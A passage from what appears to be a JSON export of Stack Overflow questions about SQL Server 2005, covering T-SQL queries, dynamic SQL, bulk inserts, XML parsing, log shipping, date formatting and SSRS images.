Result:</p>\n\n<pre><code>Count   |   Time\n    0   |  12:01\n    0   |  12:02\n    0   |  12:03\n    0   |  12:04\n    ...\n    ...\n    0   |  22:01\n    0   |  22:02\n    0   |  22:03\n    0   |  22:04\n</code></pre>\n"},{"tags":["query","tsql","sql-server-2005","stored-procedures","foreign-keys"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":10278116,"title":"How to fetch two column value in one colume based on boolean field","body":"<p>I am working with SQL Server 2005.\nI am having 3 table </p>\n\n<p><strong>Product</strong></p>\n\n<pre><code>PId   |   PName\n</code></pre>\n\n<p><strong>Service</strong></p>\n\n<pre><code>SId   |   SName\n</code></pre>\n\n<p><strong>Bill</strong></p>\n\n<pre><code>BId   |   TypeId   |   IsService\n</code></pre>\n\n<p>TypeId is PId or SId. based on IsService Field.<br /><br />\nIf <code>IsService</code> is 1 then TypeId is SId and If <code>IsService</code> is 0 then TypeId is PId</p>\n\n<p>I want to fetch PName and SName with Bill so how can I?</p>\n\n<p>I am thinking of to Write stored Procedure for this..\nand Adding Dynamic Column to Stored Procudure that column contain Either SName or PName as per IsService.</p>\n\n<p>But don't know how to write this also? </p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":205,"score":2,"question_id":1131085,"title":"Removing duplicate records","body":"<p>I am using the following query </p>\n\n<pre><code>SELECT SS.sightseeingId AS 'sID'\n     , SS.SightseeingName\n     , SS.displayPrice AS 'Price'\n     , SST.fromDate \nFROM tblSightseeings SS INNER JOIN \n     tblSightseeingTours SST ON SS.sightseeingId =  SST.sightseeingId\nWHERE SS.isActive = 1 AND SS.isDisplayOnMainPage = 1 \n</code></pre>\n\n<p>and getting result like this </p>\n\n<pre><code>sID | SightseeingName                        | Price | fromDate \n------------------------------------------------------------------------------\n  2 | Dinner Cruise Bateaux London (Premier) |    40 | 2009-04-01 00:00:00.000\n  2 | Dinner Cruise Bateaux London (Premier) |    40 | 2009-12-29 00:00:00.000\n 30 | Jack The Ripper, Ghosts and Sinister   |  35.1 | 2009-04-01 00:00:00.000\n 30 | Jack The Ripper, Ghosts and Sinister   |  35.1 | 2009-10-01 00:00:00.000\n 40 | Grand Tour of London                   |     0 | 2009-05-01 00:00:00.000\n 40 | Grand Tour of London                   |     0 | 2010-05-01 00:00:00.000\n 87 | Warwick, Stratford, Oxford and The     |    25 | 2009-04-01 00:00:00.000\n 87 | Warwick, Stratford, Oxford and The     |    25 | 2009-11-01 00:00:00.000\n</code></pre>\n\n<p>I want to display the unique records 2 one time 30 one time 40 one time. The duplicate records are due to <code>SST.fromDate</code>. </p>\n\n<p>How do I correct my query??</p>\n"},{"tags":["database","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":92,"score":1,"question_id":7495987,"title":"Merge and sync MS SQL server database","body":"<p>I have couple of kiosks running at client's location which access an online MS SQL server 2005 to process data, but the internet connectivity is unreliable. I am fine with installing SQL server on the kiosk itself and sync it once a week to the central server. Since there are lots of kiosks, it needs to be a merged sync. \nAny better ideas for caching?\nWhat are the tools for merge sync?</p>\n"},{"tags":[".net","sql-server","vb.net","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12179135,"title":"Composite Key exceptions on dynamic TSQL","body":"<p>I have a couple of dynamically built query's with a composite primary key on the <code>tblWarr_SWH_WarrCLHD_35</code> and <code>[Account No]</code>, <code>tblWarr_SWH_WarrCLHD_35.[Claim No]</code> columns. </p>\n\n<p>A new requirement has recently come out asking us to provide exceptions on the results, so the users can ask to filter out each row by <code>[Account No]</code> and <code>[Claim No]</code>. There will be an indeterminate number of row exceptions.</p>\n\n<p>What would be the best method for the client to pass in the exceptions list <code>[Account No]</code> and <code>[Claim No]</code> combinations?</p>\n\n<p>Do I need to pass in a string and parse it within the T-SQL? I could build it like this</p>\n\n<pre><code>AND NOT ([Account No] = 'abc' AND [Claim No] = 'cde') \nAND NOT ([Account No] = 'fgh' AND [Claim No] = 'ijk')\n</code></pre>\n\n<p>The results are displayed to the client software via a typed data set with two tables.</p>\n\n<p><strong>Raw Data</strong></p>\n\n<pre><code>DECLARE @SQL nvarchar(4000)\nDECLARE @SQLWhere nvarchar(4000) \nDECLARE @SQLOrder nvarchar(MAX)\n\nSET @SQL = 'SELECT tblWarr_SWH_WarrCLHD_35.[Account No], tblWarr_SWH_WarrCLHD_35.[Claim No], tblWarr_SWH_WarrCLHD_35.ClaimCost, \n                      tblWarr_SWH_WarrCLHD_35.[Serial No], tblWarr_SMT_MCType_47.[Machine Type], tblWarr_SMH_MCHist_34.[Date Built], \n                      tblWarr_SMH_MCHist_34.[Date Sold], tblWarr_SVC_ServiceCodes.[Service Code], tblWarr_DefectCodes.Code AS [Defect Code], \n                      tblWarr_SPN_PartNo_01.[Part No], tblWarr_SPN_PartNo_01.[Part Description], tblWarr_SWH_WarrCLHD_35.[Failed Part No Qty], \n                      tblWarr_MachineHours.[Machine Hours At Failure], tblWarr_SWH_WarrCLHD_35.[Claim Date], tblWarr_SNA_WarNar_77.Narrative, \n                      tblWarr_SSU_Supplier_09.[Supplier Name],tblWarr_SWH_WarrCLHD_35.[ClaimStateID]\n                FROM tblWarr_SMH_MCHist_34 INNER JOIN\n                      tblWarr_SWH_WarrCLHD_35 ON tblWarr_SMH_MCHist_34.[Serial No] = tblWarr_SWH_WarrCLHD_35.[Serial No] INNER JOIN\n                      tblWarr_SMT_MCType_47 ON tblWarr_SMH_MCHist_34.MachineTypeID = tblWarr_SMT_MCType_47.ID INNER JOIN\n                      tblWarr_SVC_ServiceCodes ON tblWarr_SWH_WarrCLHD_35.ServiceCodeFullID = tblWarr_SVC_ServiceCodes.ID INNER JOIN\n                      tblWarr_DefectCodes ON tblWarr_SWH_WarrCLHD_35.DefectCodeID = tblWarr_DefectCodes.ID INNER JOIN\n                      tblWarr_SPN_PartNo_01 ON tblWarr_SWH_WarrCLHD_35.FailedPartNoID = tblWarr_SPN_PartNo_01.ID INNER JOIN\n                      tblWarr_MachineHours ON tblWarr_SWH_WarrCLHD_35.MachineHoursID = tblWarr_MachineHours.ID INNER JOIN\n                      tblWarr_SNA_WarNar_77 ON tblWarr_SWH_WarrCLHD_35.NarrativeID = tblWarr_SNA_WarNar_77.ID INNER JOIN\n                      tblWarr_SSU_Supplier_09 ON tblWarr_SWH_WarrCLHD_35.SupplierID = tblWarr_SSU_Supplier_09.ID'\nSET @SQLWhere = ' WHERE ((tblWarr_SPN_PartNo_01.[Part No] = @_PartNumber) AND '\nSET @SQLOrder = ' ORDER BY CAST(tblWarr_SMH_MCHist_34.[Date Built] AS smalldatetime) DESC'\n\nIF (@ClaimDateFrom IS NOT NULL AND @ClaimDateTo IS NOT NULL)AND (LEN(@ClaimDateFrom) &gt; 0 AND LEN(@ClaimDateTo) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(tblWarr_SWH_WarrCLHD_35.[Claim Date] BETWEEN @_ClaimDateFrom AND @_ClaimDateTo) AND '\n\nIF (@BuildDateFrom IS NOT NULL AND @BuildDateTo IS NOT NULL)AND (LEN(@BuildDateFrom) &gt; 0 AND LEN(@BuildDateTo) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(CAST(tblWarr_SMH_MCHist_34.[Date Built] AS SmalldateTime) BETWEEN @_BuildDateFrom AND @_BuildDateTo) AND '\n\nIF (@ClaimStates IS NOT NULL)AND (LEN(@ClaimStates) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(tblWarr_SWH_WarrCLHD_35.[ClaimStateID] IN (SELECT value FROM Split(''' + ',' + ''',@_ClaimStates))) AND '\n\nIF LEN(@SQLWhere) &gt; 0\n    SET @SQL = @SQL + LEFT(@SQLWhere, LEN(@SQLWhere)-4) + ')' + @SQLOrder\n\nEXEC sp_executesql @SQL,\n    N'@_PartNumber nvarchar(20), @_ClaimDateFrom smalldatetime, @_ClaimDateTo smalldatetime, @_BuildDateFrom smalldatetime, @_BuildDateTo smalldatetime, @_ClaimStates nvarchar(50)',\n    @_PartNumber = @PartNumber, @_ClaimDateFrom = @ClaimDateFrom, @_ClaimDateTo = @ClaimDateTo, @_BuildDateFrom = @BuildDateFrom, @_BuildDateTo = @BuildDateTo, @_ClaimStates = @ClaimStates\n</code></pre>\n\n<p><strong>Aggregate Data</strong></p>\n\n<pre><code>DECLARE @SQL nvarchar(4000)\nDECLARE @SQLWhere nvarchar(4000) \nDECLARE @SQLOrder nvarchar(MAX)\nDECLARE @Date1 as nvarchar(5)   \n\nSET @Date1 = '01/'\n\nSET @SQL = 'SELECT CAST(@_Date1 + CAST(DATEPART(mm,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(2)) + ''' + '/' + ''' + CAST(DATEPART(yyyy,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(4)) as smalldatetime) AS ClaimDate , COUNT(tblWarr_SWH_WarrCLHD_35.[Claim No]) As FaultCount\n                FROM tblWarr_SMH_MCHist_34 INNER JOIN\n                      tblWarr_SWH_WarrCLHD_35 ON tblWarr_SMH_MCHist_34.[Serial No] = tblWarr_SWH_WarrCLHD_35.[Serial No] INNER JOIN\n                      tblWarr_SMT_MCType_47 ON tblWarr_SMH_MCHist_34.MachineTypeID = tblWarr_SMT_MCType_47.ID INNER JOIN\n                      tblWarr_SVC_ServiceCodes ON tblWarr_SWH_WarrCLHD_35.ServiceCodeFullID = tblWarr_SVC_ServiceCodes.ID INNER JOIN\n                      tblWarr_DefectCodes ON tblWarr_SWH_WarrCLHD_35.DefectCodeID = tblWarr_DefectCodes.ID INNER JOIN\n                      tblWarr_SPN_PartNo_01 ON tblWarr_SWH_WarrCLHD_35.FailedPartNoID = tblWarr_SPN_PartNo_01.ID INNER JOIN\n                      tblWarr_MachineHours ON tblWarr_SWH_WarrCLHD_35.MachineHoursID = tblWarr_MachineHours.ID INNER JOIN\n                      tblWarr_SNA_WarNar_77 ON tblWarr_SWH_WarrCLHD_35.NarrativeID = tblWarr_SNA_WarNar_77.ID INNER JOIN\n                      tblWarr_SSU_Supplier_09 ON tblWarr_SWH_WarrCLHD_35.SupplierID = tblWarr_SSU_Supplier_09.ID'\nSET @SQLWhere = ' WHERE ((tblWarr_SPN_PartNo_01.[Part No] = @_PartNumber) AND '\nSET @SQLOrder = ' GROUP BY CAST(@_Date1 + CAST(DATEPART(mm,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(2)) + ''' + '/' + ''' + CAST(DATEPART(yyyy,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(4)) as smalldatetime) ORDER BY CAST(@_Date1 + CAST(DATEPART(mm,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(2)) + ''' + '/' + ''' + CAST(DATEPART(yyyy,CAST(tblWarr_SMH_MCHist_34.[Date Built] as smalldatetime)) as nvarchar(4)) as smalldatetime)'\n\nIF (@ClaimDateFrom IS NOT NULL AND @ClaimDateTo IS NOT NULL)AND (LEN(@ClaimDateFrom) &gt; 0 AND LEN(@ClaimDateTo) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(CAST(tblWarr_SWH_WarrCLHD_35.[Claim Date] AS SmalldateTime) BETWEEN @_ClaimDateFrom AND @_ClaimDateTo) AND '\n\nIF (@BuildDateFrom IS NOT NULL AND @BuildDateTo IS NOT NULL)AND (LEN(@BuildDateFrom) &gt; 0 AND LEN(@BuildDateTo) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(CAST(tblWarr_SMH_MCHist_34.[Date Built] AS SmalldateTime) BETWEEN @_BuildDateFrom AND @_BuildDateTo) AND '\n\nIF (@ClaimStates IS NOT NULL)AND (LEN(@ClaimStates) &gt; 0)\n    SET @SQLWhere = @SQLWhere + '(tblWarr_SWH_WarrCLHD_35.[ClaimStateID] IN (SELECT value FROM Split(''' + ',' + ''',@_ClaimStates))) AND '\n\nIF LEN(@SQLWhere) &gt; 0\n    SET @SQL = @SQL + LEFT(@SQLWhere, LEN(@SQLWhere)-4) + ')' + @SQLOrder\n\nEXEC sp_executesql @SQL,\n    N'@_PartNumber nvarchar(20), @_ClaimDateFrom smalldatetime, @_ClaimDateTo smalldatetime, @_BuildDateFrom smalldatetime, @_BuildDateTo smalldatetime, @_Date1 nvarchar(5), @_ClaimStates nvarchar(50) ',\n    @_PartNumber = @PartNumber, @_ClaimDateFrom = @ClaimDateFrom, @_ClaimDateTo = @ClaimDateTo, @_BuildDateFrom = @BuildDateFrom, @_BuildDateTo = @BuildDateTo, @_Date1 = @Date1, @_ClaimStates = @ClaimStates\n</code></pre>\n"},{"tags":["database","perl","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12177731,"title":"SQL Server backup command from Perl","body":"<p>Trying to take remote backup of sql server database using Perl. But somehow getting following error : </p>\n\n<p>Backup Error: 3041, Severity: 16, State: 1.\nBACKUP failed to complete the command BACKUP DATABASE testdb. Check the backup application log for detailed messages.</p>\n\n<p>The scripts looks like :</p>\n\n<pre><code>use DBI;\nmy $dsn = 'DBI:ODBC:Driver={SQL Server}';\nmy $host = 'hostname';\nmy $database = 'dbname';\nmy $user = 'sa';\nmy $auth = 'xxxxxxx';\n\nmy $dbh = DBI-&gt;connect(\"$dsn;Server=$host\",\n                       $user,\n                       $auth,\n                       { RaiseError =&gt; 1,\n                         AutoCommit =&gt; 1}\n                      ) || die \"Database connection not made: $DBI::errstr\";\n\nmy $sql = \"BACKUP DATABASE testdb TO DISK='d:\\sql_share\\backup.bak'\";\nmy $sth = $dbh-&gt;prepare( $sql );\n\n$sth-&gt;execute();\nprint \"\\nexecuted\";\n\n$sth-&gt;finish();\n$dbh-&gt;disconnect();\n</code></pre>\n\n<p>using the same script able to create database, query database etc. on remote server.</p>\n"},{"tags":["c#","sql","sql-server","sql-server-2005"],"answer_count":10,"favorite_count":12,"up_vote_count":32,"down_vote_count":0,"view_count":18874,"score":32,"question_id":24200,"title":"What's the fastest way to bulk insert a lot of data in SQL Server (C# client)","body":"<p>I am hitting some performance bottlenecks with my C# client inserting bulk data into a SQL Server 2005 database and I'm looking for ways in which to speed up the process.</p>\n\n<p>I am already using the SqlClient.SqlBulkCopy (which is based on TDS) to speed up the data transfer across the wire which helped a lot, but I'm still looking for more.</p>\n\n<p>I have a simple table that looks like this: </p>\n\n<pre><code> CREATE TABLE [BulkData](\n [ContainerId] [int] NOT NULL,\n [BinId] [smallint] NOT NULL,\n [Sequence] [smallint] NOT NULL,\n [ItemId] [int] NOT NULL,\n [Left] [smallint] NOT NULL,\n [Top] [smallint] NOT NULL,\n [Right] [smallint] NOT NULL,\n [Bottom] [smallint] NOT NULL,\n CONSTRAINT [PKBulkData] PRIMARY KEY CLUSTERED \n (\n  [ContainerIdId] ASC,\n  [BinId] ASC,\n  [Sequence] ASC\n))\n</code></pre>\n\n<p>I'm inserting data in chunks that average about 300 rows where ContainerId and BinId are constant in each chunk and the Sequence value is 0-n and the values are pre-sorted based on the primary key.  </p>\n\n<p>The %Disk time performance counter spends a lot of time at 100% so it is clear that disk IO is the main issue but the speeds I'm getting are several orders of magnitude below a raw file copy.</p>\n\n<p>Does it help any if I:</p>\n\n<ol>\n<li>Drop the Primary key while I am doing the inserting and recreate it later</li>\n<li>Do inserts into a temporary table with the same schema and periodically transfer them into the main table to keep the size of the table where insertions are happening small</li>\n<li>Anything else?</li>\n</ol>\n\n<p>--\nBased on the responses I have gotten, let me clarify a little bit:</p>\n\n<p>Portman: I'm using a clustered index because when the data is all imported I will need to access data sequentially in that order.  I don't particularly need the index to be there while importing the data.  Is there any advantage to having a nonclustered PK index while doing the inserts as opposed to dropping the constraint entirely for import?</p>\n\n<p>Chopeen:  The data is being generated remotely on many other machines (my SQL server can only handle about 10 currently, but I would love to be able to add more).  It's not practical to run the entire process on the local machine because it would then have to process 50 times as much input data to generate the output.</p>\n\n<p>Jason: I am not doing any concurrent queries against the table during the import process, I will try dropping the primary key and see if that helps.</p>\n\n<p>~ Andrew</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12169279,"title":"Is it possible to refactor this statement to remove the subquery?","body":"<p>I'm trying to take data from one column, <code>MyTable.SSN</code>, and copy it to another in the same table, <code>MyTable.SSNWithDashes</code>, just formatted differently.  If <code>MyTable.SSN</code> doesn't have exactly 9 digits, I don't care to process it at all.</p>\n\n<p>I've tried this:</p>\n\n<pre><code>IF( SELECT LEN( [SSN] ) FROM [MyTable] ) = 9\nUPDATE [MyTable] SET [SSNWithDashes] = LEFT( [SSN], 3 ) + '-' + SUBSTRING( [SSN], 4, 2 ) + '-' + RIGHT( [SSN], 4 ) \nELSE\nUPDATE [MyTable] SET [SSNWithDashes] = NULL\n</code></pre>\n\n<p>While this works, it throws an error:</p>\n\n<p><code>Subquery returned more than 1 value. This is not permitted when the subquery follows =, !=, &lt;, &lt;= , &gt;, &gt;= or when the subquery is used as an expression.</code></p>\n\n<p>While I do understand what the warning is saying, I'm not really sure how to go about this differently.</p>\n\n<p>How can I refactor this to remove that warning (and perhaps read a little cleaner)?</p>\n"},{"tags":["sql-server","xml","sql-server-2005","xquery"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12166242,"title":"Import XML by matching on tag attribute content in SQL Server 2005","body":"<p>I have an XML data file that looks like this:</p>\n\n<pre><code>&lt;Sales&gt;\n    &lt;Store Number=\"8\" Date=\"2012-08-20T03:00:00\"&gt;\n        &lt;Value Field=\"CanceledOrders\" Value=\"65.00\"/&gt;\n        &lt;Value Field=\"TotalDollars\" Value=\"13.57\"/&gt;\n    &lt;/Store&gt;\n    &lt;Store Number=\"10\" Date=\"2012-08-20T03:00:00\"&gt;\n        &lt;Value Field=\"CanceledOrders\" Value=\"38.00\"/&gt;\n        &lt;Value Field=\"TotalDollars\" Value=\"29.22\"/&gt;\n    &lt;/Store&gt;\n&lt;/Sales&gt;\n</code></pre>\n\n<p>I am scratching my head on how to extract this into a normal SQL table like this:</p>\n\n<pre><code>+--------+---------------------+----------------+--------------+\n| Number |        Date         | CanceledOrders | TotalDollars |\n+--------+---------------------+----------------+--------------+\n|      8 | 2012-08-20T03:00:00 | 65.00          | 13.57        |\n|     10 | 2012-08-20T03:00:00 | 38.00          | 29.22        |\n+--------+---------------------+----------------+--------------+\n</code></pre>\n\n<p>Here is what I have so far. I can't figure out how to match on XML attribute content value.\nI would like to match on the /Sales/Store/Value/@Field contents and return the value from /Sales/Store/Value/@Value.</p>\n\n<pre><code>DECLARE @X AS xml\n\nSET @X = '&lt;Sales&gt;\n  &lt;Store Number=\"8\" Date=\"2012-08-20T03:00:00\"&gt;\n    &lt;Value Field=\"CanceledOrders\" Value=\"65.00\" /&gt;\n    &lt;Value Field=\"TotalDollars\" Value=\"13.57\" /&gt;\n  &lt;/Store&gt;\n  &lt;Store Number=\"10\" Date=\"2012-08-20T03:00:00\"&gt;\n    &lt;Value Field=\"CanceledOrders\" Value=\"38.00\" /&gt;\n    &lt;Value Field=\"TotalDollars\" Value=\"29.22\" /&gt;\n  &lt;/Store&gt;\n&lt;/Sales&gt;'\n\n-- This is my start but it obviously doesn't return what I need.\nSELECT Y.ID.value('(@Number)[1]', 'int') AS Number,\n       Y.ID.value('(@Date)[1]', 'datetime') AS [Date],\n       Y.ID.value('(Value/@Field)[1]', 'varchar(max)') AS \"Field\",\n       Y.ID.value('(Value/@Value)[1]', 'varchar(max)') AS \"Value\"\nFROM   @X.nodes('/Sales/Store') AS Y(ID) \n</code></pre>\n"},{"tags":["c#","asp.net",".net","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":281,"score":0,"question_id":12166101,"title":"Thread is being aborted","body":"<p>What exactly does all this mean below. I am running an asynchronous web request that calls a page that sends code to my database. Then my database fires off a stored procedure that runs into one of my SQL assemblies.  Most times it works, but sometimes I get this:</p>\n\n<p>Thread was being aborted.</p>\n\n<p>Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. </p>\n\n<p>Exception Details: System.Threading.ThreadAbortException: Thread was being aborted.</p>\n\n<p>Source Error: </p>\n\n<pre><code>An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.\n</code></pre>\n\n<p>Stack Trace: </p>\n\n<pre><code>[ThreadAbortException: Thread was being aborted.]\n    System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean&amp; completedSynchronously) +486\n    System.Web.ApplicationStepManager.ResumeSteps(Exception error) +501\n    System.Web.HttpApplication.System.Web.IHttpAsyncHandler.BeginProcessRequest(HttpContext context, AsyncCallback cb, Object extraData) +123\n    System.Web.HttpRuntime.ProcessRequestInternal(HttpWorkerRequest wr) +379\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","log-shipping"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12161206,"title":"SQL Server Log Shipping and creating a user on secondary server","body":"<p>We have server <code>A</code> that is our production server, we are using SQL Server log shipping to ship transaction logs from server <code>A</code> to <code>B</code>.</p>\n\n<p>I understand that server <code>B</code> is then in a warm-standby read-only state.</p>\n\n<p>My question is, how can we add a windows domain account to have read-only access to that database on server <code>B</code> but not have access to the database on server <code>A</code>.</p>\n\n<p>When I try to create a user and assign read-only access to server <code>B</code>, I cant of course be because server <code>B</code> is in standbay mode. How can I get around this?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server-2005","tsql","min"],"answer_count":10,"favorite_count":2,"up_vote_count":10,"down_vote_count":1,"view_count":22789,"score":9,"question_id":368351,"title":"What's the best way to select the minimum value from multiple columns?","body":"<p>Given the following table in SQL Server 2005:</p>\n\n<pre><code>ID   Col1   Col2   Col3\n--   ----   ----   ----\n1       3     34     76  \n2      32    976     24\n3       7    235      3\n4     245      1    792\n</code></pre>\n\n<p>What is the best way to write the query that yields the following result (i.e. one that yields the final column - a column containing the minium values out of Col1, Col2, and Col 3 <strong>for each row</strong>)?</p>\n\n<pre><code>ID   Col1   Col2   Col3  TheMin\n--   ----   ----   ----  ------\n1       3     34     76       3\n2      32    976     24      24\n3       7    235      3       3\n4     245      1    792       1\n</code></pre>\n\n<p><strong><em>UPDATE:</em></strong></p>\n\n<p>For clarification (as I have said in the coments) in the real scenario the database is <strong>properly normalized</strong>. These \"array\" columns are not in an actual table but are in a result set that is required in a report. And the new requirement is that the report also needs this MinValue column. I can't change the underlying result set and therefore I was looking to T-SQL for a handy \"get out of jail card\".</p>\n\n<p>I tried the CASE approach mentioned below and it works, although it is a bit cumbersome. It is also more complicated than stated in the answers because you need to cater for the fact that there are two min values in the same row.</p>\n\n<p>Anyway, I thought I'd post my current solution which, given my constraints, works pretty well. It uses the UNPIVOT operator:</p>\n\n<pre><code>with cte (ID, Col1, Col2, Col3)\nas\n(\n    select ID, Col1, Col2, Col3\n    from TestTable\n)\nselect cte.ID, Col1, Col2, Col3, TheMin from cte\njoin\n(\n    select\n    \tID, min(Amount) as TheMin\n    from \n    \tcte \n    \tUNPIVOT (Amount for AmountCol in (Col1, Col2, Col3)) as unpvt\n    group by ID\n) as minValues\non cte.ID = minValues.ID\n</code></pre>\n\n<p>I'll say upfront that I don't expect this to offer the best performance, but given the circumstances (I can't redesign all the queries just for the new MinValue column requirement), it is a pretty elegant \"get out of jail card\".</p>\n"},{"tags":["sql-server-2005","reporting-services","tiff"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1764,"score":1,"question_id":126584,"title":"Displaying Tiff files in SSRS reports","body":"<p>I have a requirement to be be able to embed scanned tiff images into some SSRS reports.</p>\n\n<p>When I design a report in VS2005 and add an image control the tiff image displays perfectly however when I build it. I get the warning :</p>\n\n<p><code>Warning    2   [rsInvalidMIMEType] The value of the MIMEType property for the image ‘image1’ is “image/tiff”, which is not a valid MIMEType.   c:\\SSRSStuff\\TestReport.rdl 0   0</code></p>\n\n<p>and instead of an image I get the little red x.</p>\n\n<p>Has anybody overcome this issue?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":109,"score":0,"question_id":12158222,"title":"how to find data for whole month for date format dd/mm/yyyy?","body":"<p>I have a database with date format \"yyyyymmdd' and data-type varchar(8). In this case when I need to find a data for whole month I used to write code like below :</p>\n\n<pre><code>  select * from table1\n  where Date Between (convert(varchar(6),getdate(),112)+'01')\n  AND (convert(varchar(6),getdate(),112)+'31'))\n</code></pre>\n\n<p>Now I just have a new table with date format \"dd/mm/yyyy\" and date type varchar(10) and I would like to  extract data from the table for whole month without specifying exact date. I want start date as first day of current and month and end date as last day of the current month.</p>\n\n<p>But I don't now how to do the same as the date format is now 'dd/mm/yyyy'. </p>\n"},{"tags":["asp.net","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":12157037,"title":"How to insert all rows in grid at once into SQL Server 2005 database?","body":"<p>I need to insert all the rows in a gridview into a SQL Server 2005 database at once. </p>\n\n<p>Number of rows can be 1 to n (not more than 200)</p>\n\n<p>I have investigated the following options:</p>\n\n<ul>\n<li>Loops: I want to avoid the iterations.</li>\n<li>Table datatype: available in SQL Server 2008 and onwards only</li>\n<li>Bulk Copy: useful in case of bulk data. I am not sure whether I can use it insert less no of rows (performance wise)</li>\n</ul>\n\n<p>What else I can use?</p>\n"},{"tags":["sql-server-2005","datetime-format"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12156297,"title":"Date format issue ","body":"<p>One problem in SQL Server 2005:</p>\n\n<p>I need all dates in <code>dd/mm/yyyy</code> format </p>\n\n<pre><code>SELECT\n    CONVERT(NCHAR(10), FromDate, 103) AS FromDate,\n    CONVERT(NCHAR(10), ToDate, 103) AS ToDate \nFROM Tbl_PropertyRoomSeasonPrices\n</code></pre>\n\n<p>OUTPUT :</p>\n\n<pre><code>28/08/2012  |   09/01/2012\n\ndd/mm/yyyy  |   mm/dd/yyyy  \n(CORRECT)       (WRONG)\n</code></pre>\n\n<p>but 103 for fromDate and 101 for toDate makes it both same, why the variations?</p>\n\n<p><strong>values are saved as follows:</strong> </p>\n\n<p><em><strong>BLL</em></strong></p>\n\n<pre><code>public DateTime FromDate\n    {\n        get {return _fromDate;} \n        set{ _fromDate = value; }\n    }\n\n    public DateTime ToDate\n    {\n        get {return _toDate;}   \n        set{ _toDate = value;   }\n    }\n\n public bool Save()\n    {\n        return _dalTbl_PropertyRoomSeasonPrices.Save();\n    }\n</code></pre>\n\n<p><em><strong>DAL</em></strong></p>\n\n<pre><code>public bool Save()\n    {\n        try\n{\n DataAccessLayerBaseClassDALBC=DataAccessLayerFactory.GetDataAccessLayer();         \n IDataParameter[]parameters=DALBC.CreateParameters(2);\n parameters[0] = DALBC.CreateParameter(\"@FromDate\",    this._tbl_propertyroomseasonprices.FromDate);\nparameters[1] = DALBC.CreateParameter(\"@ToDate\",    this._tbl_propertyroomseasonprices.ToDate);\nDALBC.ExecuteScalar(\"spSave_Tbl_PropertyRoomSeasonPrices\", CommandType.StoredProcedure, parameters);                \n        }\n        catch (Exception ex)\n        {\n\n            return false;\n        }\n        return true;\n    }\n</code></pre>\n\n<p><em><strong>SQL</em></strong></p>\n\n<pre><code>ALTER PROCEDURE [dbo].[spSave_Tbl_PropertyRoomSeasonPrices]\n(\n@Id int,\n\n@FromDate datetime = NULL,\n@ToDate datetime = NULL\n\n)\nAS\nDECLARE @count int  \nSET NOCOUNT ON\n\nSELECT @count=COUNT(*) FROM Tbl_PropertyRoomSeasonPrices WHERE \n        [Id] = @Id\n\nIF @count&lt;=0 BEGIN\n    INSERT INTO [Tbl_PropertyRoomSeasonPrices]\n    (\n\n    [FromDate],\n    [ToDate]\n    )\n    VALUES\n    (   \n\n    @FromDate,\n    @ToDate     \n    )\n\nSELECT @Id = SCOPE_IDENTITY();\n\n\nEND\nELSE BEGIN\n    UPDATE [Tbl_PropertyRoomSeasonPrices]\n    SET\n\n    [FromDate] = @FromDate,\n    [ToDate] = @ToDate\n\n    WHERE \n            [Id] = @Id\n\n\nEND \n\n\n        SELECT @Id\n</code></pre>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":193,"score":7,"question_id":12059119,"title":"TSQL equally divide resultset to groups and update them","body":"<p>I have my database with 3 tables like so:</p>\n\n<p><img src=\"http://i.stack.imgur.com/uPj06.jpg\" alt=\"enter image description here\"></p>\n\n<p>Orders table has data like below:</p>\n\n<pre><code>OrderID    OperatorID    GroupID        OrderDesc    Status    Cash    ...\n--------------------------------------------------------------------------\n      1             1          1      small order         1     100 \n      2             1          1    another order         2       0 \n      3             1          2      xxxxxxxxxxx         2    1000 \n      5             2          2      yyyyyyyyyyy         2     150 \n      9             5          1      xxxxxxxxxxx         1       0 \n     10          NULL          2      xxxxxxxxxxx         1      10 \n     11          NULL          3      xxxxxxxxxxx         1     120 \n</code></pre>\n\n<p>Operators table:</p>\n\n<pre><code>OperatorID    Name    GroupID    Active\n---------------------------------------\n      1       John          1         1\n      2       Kate          1         1\n      4       Jack          2         1\n      5       Will          1         0\n      6        Sam          3         